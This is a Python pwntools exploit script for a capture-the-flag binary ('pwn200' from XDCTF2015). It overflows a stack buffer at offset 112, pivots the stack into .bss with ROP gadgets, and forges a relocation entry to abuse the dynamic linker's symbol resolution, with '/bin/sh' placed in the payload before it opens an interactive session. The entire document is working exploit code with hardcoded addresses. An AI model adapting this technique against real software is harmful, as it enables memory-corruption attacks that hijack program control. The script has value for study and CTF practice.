#!python
from pwn import *

offset = 112

addr_plt_read  = 0x08048390   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x080483c0   # objdump -d -j.plt bof | grep "write"

#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x0804856c
pop_ebp_ret   =  0x08048453
leave_ret = 0x08048481

stack_size = 0x800
addr_bss   = 0x0804a020   # readelf -S bof | grep ".bss"
base_stage = addr_bss + stack_size

target = "./pwn200"
io   = process(target)

io.recvuntil('Welcome to XDCTF2015~!\n')
# io.gdb_hint([0x80484bd])

buf1  = 'A' * offset
buf1 += p32(addr_plt_read)
buf1 += p32(pppop_ret)
buf1 += p32(0)
buf1 += p32(base_stage)
buf1 += p32(100)
buf1 += p32(pop_ebp_ret)
buf1 += p32(base_stage)
buf1 += p32(leave_ret)
io.sendline(buf1)
#gdb.attach(io)

cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a010
r_info         = 0x507
fake_reloc     = p32(addr_got_write) + p32(r_info)

buf2 = 'AAAA'
buf2 += p32(addr_plt_start)
buf2 += p32(index_offset)
buf2 += 'AAAA'
buf2 += p32(1)
buf2 += p32(base_stage+80)
buf2 += p32(len(cmd))
buf2 += fake_reloc
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.sendline(buf2)

io.interactive()

